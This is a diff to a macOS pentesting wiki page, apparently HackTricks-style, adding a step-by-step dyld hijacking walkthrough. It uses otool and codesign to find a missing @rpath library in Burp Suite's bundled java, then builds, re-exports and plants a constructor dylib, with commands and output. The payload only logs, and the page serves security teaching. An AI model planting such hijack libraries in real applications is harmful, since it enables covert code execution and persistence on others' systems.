@@ -1,4 +1,4 @@
-# DYLD\_INSERT\_LIBRARIES
+# macOS Dyld Hijacking & DYLD\_INSERT\_LIBRARIES
 
 <details>
 
@@ -12,7 +12,7 @@
 
 </details>
 
-## Basic example
+## DYLD\_INSERT\_LIBRARIES Basic example
 
 **Library to inject** to execute a shell:
 
@@ -51,12 +51,128 @@ Injection:
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
 
+## Dyld Hijacking Example
+
+The targeted vulenrable binary is `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java`.
+
+{% tabs %}
+{% tab title="LC_RPATH" %}
+{% code overflow="wrap" %}
+```bash
+# Check where are the @rpath locations
+otool -l "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java" | grep LC_RPATH -A 2
+          cmd LC_RPATH
+      cmdsize 32
+         path @loader_path/. (offset 12)
+--
+          cmd LC_RPATH
+      cmdsize 32
+         path @loader_path/../lib (offset 12)
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="@rpath" %}
+{% code overflow="wrap" %}
+```bash
+# Check librareis loaded using @rapth and the used versions
+otool -l "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java" | grep "@rpath" -A 3
+         name @rpath/libjli.dylib (offset 24)
+   time stamp 2 Thu Jan  1 01:00:02 1970
+      current version 1.0.0
+compatibility version 1.0.0
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="entitlements" %}
+<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java"
+<strong>[...]com.apple.security.cs.disable-library-validation[...]
+</strong></code></pre>
+{% endtab %}
+{% endtabs %}
+
+With the previous info we know that it's **not checking the signature of the loaded libraries** and it's **trying to load a library from**:
+
+* `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib`
+* `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib`
+
+However, the first one doesn't exist:
+
+```bash
+pwd
+/Applications/Burp Suite Professional.app
+
+find ./ -name libjli.dylib
+./Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib
+./Contents/Resources/jre.bundle/Contents/MacOS/libjli.dylib
+```
+
+So, it's possible to hijack it! Create a library that **executes some arbitrary code and exports the same functionalities** as the legit library by reexporting it. And remember to compile it with the expected versions:
+
+{% code title="libjli.m" %}
+```objectivec
+#import <Foundation/Foundation.h>
+
+__attribute__((constructor))
+void custom(int argc, const char **argv) {
+    NSLog(@"[+] dylib hijacked in %s",argv[0]);
+}
+```
+{% endcode %}
+
+Compile it:
+
+{% code overflow="wrap" %}
+```bash
+gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation libjli.m -Wl,-reexport_library,"/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" -o libjli.dylib
+# Note the versions and the reexport
+```
+{% endcode %}
+
+The reexport path created in the library is relative to the loader, lets change it for an absolute path to the library to export:
+
+{% code overflow="wrap" %}
+```bash
+#Check relative
+otool -l libjli.dylib| grep REEXPORT -A 2
+         cmd LC_REEXPORT_DYLIB
+         cmdsize 48
+         name @rpath/libjli.dylib (offset 24)
+
+#Change to absolute to the location of the library
+install_name_tool -change @rpath/libjli.dylib "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" libjli.dylib
+
+# Check again
+otool -l libjli.dylib| grep REEXPORT -A 2
+          cmd LC_REEXPORT_DYLIB
+      cmdsize 128
+         name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
+```
+{% endcode %}
+
+Finally just copy it to the **hijacked location**:
+
+{% code overflow="wrap" %}
+```bash
+cp libjli.dylib "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib"
+```
+{% endcode %}
+
+And **execute** the binary and check the **library was loaded**:
+
+<pre class="language-context"><code class="lang-context">./java
+<strong>2023-05-15 15:20:36.677 java[78809:21797902] [+] dylib hijacked in ./java
+</strong>Usage: java [options] &#x3C;mainclass> [args...]
+           (to execute a class)
+</code></pre>
+
 ## Bigger Scale
 
 If you are planing on trying to inject libraries in unexpected binaries you could check the event messages to find out when the library is loaded inside a process (in this case remove the printf and the `/bin/bash` execution).
 
 ```bash
-sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "dylib injected"'
+sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
 
 ## Check restrictions
